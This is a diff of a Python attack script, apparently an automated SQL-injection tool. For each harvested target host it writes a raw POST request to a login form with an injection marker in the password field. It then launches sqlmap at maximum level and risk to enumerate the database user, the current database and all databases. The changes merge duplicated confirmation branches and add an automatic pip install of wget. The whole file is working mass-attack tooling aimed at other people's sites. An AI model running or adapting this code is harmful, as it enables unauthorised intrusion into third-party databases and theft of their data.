@@ -2,7 +2,6 @@ import os
 import platform
 import time
 import requests
-import wget
 import sys
 import re
 from zipfile import ZipFile
@@ -14,6 +13,13 @@ class c:
 	r       = "\33[31m"
 	g     = "\33[32m"
 	y    = "\33[33m"
+
+try:
+    import wget
+except ImportError:
+    print("[*] Module wget missing, try to install it for you :)")
+    os.system("pip3 install wget")
+
 
 try:
     os.mkdir('output')
@@ -130,20 +136,12 @@ def Exploit(Target):
                     w.write(url_list + '\n')
                 with open("output/post_" + url_parse[1] +".txt", 'a') as we:
                     we.write("""POST / HTTP/1.1\nHost: """+ url_parse[1] +"""\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 21\nOrigin: http://"""+ url_parse[1] +"""\nDNT: 1\nConnection: close\nReferer: http://"""+ url_parse[1] +"""/\nCookie: PHPSESSID=huvmumq33uu22oo2ml07indcdgtn3180qtv07kqhicabo0j9dqh0\nUpgrade-Insecure-Requests: 1\n\nusr=a&pwd=a&FBD=Masuk""")
-                if attack == 'Y':
+                if attack.lower().startswith("y"):
                     print(c.b + c.g +'[+] Attacking '+ url_parse[1] +' ...'+ c.res)
                     if os_plat == 'Windows':
                         os.system('start cmd /k "title Attacking '+ url_parse[1] + ' && python .sqlmap/sqlmap.py -r output/post_' + url_parse[1] + '.txt --threads=1 --level=5 --risk=3 --current-user --current-db --batch --dbs"')
                     elif os_plat == 'Linux':
-                        os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db --dbs && sleep 10'")
-                        
-                elif attack == 'y':
-                    print(c.b + c.g +'[+] Attacking '+ url_parse[1] +' ...'+ c.res)
-                    if os_plat == 'Windows':
-                        os.system('start cmd /k "title Attacking '+ url_parse[1] + ' && python .sqlmap/sqlmap.py -r output/post_' + url_parse[1] + '.txt --threads=1 --level=5 --risk=3 --current-user --current-db --batch --dbs"')
-                    elif os_plat == 'Linux':
-                        os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db --dbs && sleep 10'")
-                        
+                        os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db --dbs && sleep 10'")  
                 else:
                     pass
 
@@ -153,19 +151,12 @@ def Exploit(Target):
                     w.write(url_list + "\n")
                 with open("output/post_" + url_parse[1] +".txt", 'a') as we:
                     we.write("""POST / HTTP/1.1\nHost: """+ url_parse[1] +"""\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 21\nOrigin: http://"""+ url_parse[1] +"""\nDNT: 1\nConnection: close\nReferer: http://"""+ url_parse[1] +"""/\nCookie: PHPSESSID=huvmumq33uu22oo2ml07indcdgtn3180qtv07kqhicabo0j9dqh0\nUpgrade-Insecure-Requests: 1\n\nusr=a&pwd=a*&FBD=Masuk""")
-                if attack == 'Y':
+                if attack.lower().startswith("y"):
                     print(c.b + c.g +'[+] Attacking '+ url_parse[1] +' ...'+ c.res)
                     if os_plat == 'Windows':
                         os.system('start cmd /k "title Attacking '+ url_parse[1] + ' && python .sqlmap/sqlmap.py -r output/post_' + url_parse[1] + '.txt --threads=1 --level=5 --risk=3 --current-user --current-db --batch --dbs"')
                     elif os_plat == 'Linux':
-                        os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db --dbs && sleep 10'")
-                elif attack == 'y':
-                    print(c.b + c.g +'[+] Attacking '+ url_parse[1] +' ...'+ c.res)
-                    if os_plat == 'Windows':
-                        os.system('start cmd /k "title Attacking '+ url_parse[1] + ' && python .sqlmap/sqlmap.py -r output/post_' + url_parse[1] + '.txt --threads=1 --level=5 --risk=3 --current-user --current-db --batch --dbs"')
-                    elif os_plat == 'Linux':
-                        os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db --dbs && sleep 10'")
-                        
+                        os.system("xterm -xrm 'XTerm.vt100.allowTitleOps: false' -T 'Attacking "+ url_parse[1] +"' -e 'sqlmap -r output/post_"+ url_parse[1] +".txt --threads=10 --level=5 --risk=3 --time-sec=3 --batch --current-user --current-db --dbs && sleep 10'")     
                 else:
                     pass
             else:
